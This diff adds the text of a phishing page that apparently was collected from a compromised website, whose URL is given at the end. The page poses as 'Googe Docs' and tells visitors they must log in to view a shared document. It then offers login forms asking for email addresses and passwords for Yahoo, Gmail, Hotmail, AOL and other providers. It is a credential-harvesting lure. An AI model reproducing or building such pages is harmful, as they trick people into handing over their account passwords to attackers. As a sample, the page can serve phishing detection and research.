@@ -1,0 +1,192 @@
+<div> 
+Googe Docs 
+ 
+ 
+ 
+ 
+
+ 
+
+ 
+ 
+ 
+ 
+
+ 
+
+ 
+ 
+
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+To View shared document  
+you are required to Login with your email address below 
+ 
+ 
+ 
+ 
+Choose your email provider below and login: 
+
+ 
+
+ 
+
+ 
+ 
+ 
+     
+ 
+ 
+ 
+ 
+     
+ 
+ 
+ 
+ 
+
+ 
+ 
+
+ 
+
+ 
+ close [x] 
+ 
+ 
+ 
+ 
+				Yahoo Email Address: 
+                 
+				 
+			 
+				Yahoo Password 
+                 
+				 
+                 
+                 
+                 
+			 
+
+
+
+ 
+ 
+ 
+ 
+ 
+ close [x] 
+ 
+ 
+ 
+ 
+				Gmail Email Address: 
+
+                 
+				 
+			 
+				Gmail Password 
+                 
+				 
+                 
+                 
+                 
+			 
+             
+ 
+
+
+
+ 
+ 
+ 
+ 
+ close [x] 
+ 
+ 
+ 
+				Hotmail Email Address: 
+                 
+				 
+			 
+				Hotmail Password 
+                 
+				 
+                 
+                 
+                 
+			 
+             
+
+
+
+ 
+ 
+ 
+ 
+ close [x] 
+ 
+ 
+ 
+				Aol Email Address: 
+                 
+				 
+			 
+				Aol Password 
+                 
+				 
+                 
+                 
+                 
+			 
+             
+
+
+
+ 
+ 
+ 
+ 
+ close [x] 
+ 
+ 
+ 
+				Email Address: 
+                 
+				 
+			 
+				Password 
+                 
+				 
+                 
+                 
+                 
+			 
+             
+
+
+
+ 
+ 
+  
+  
+  
+ 
+ 
+ 
+  
+ 
+ 
+ 
+ 
+ 
+</div>******************* 
+ FROM http://insurex.cl/myself.ftp/googledocss/googledocss/sss/
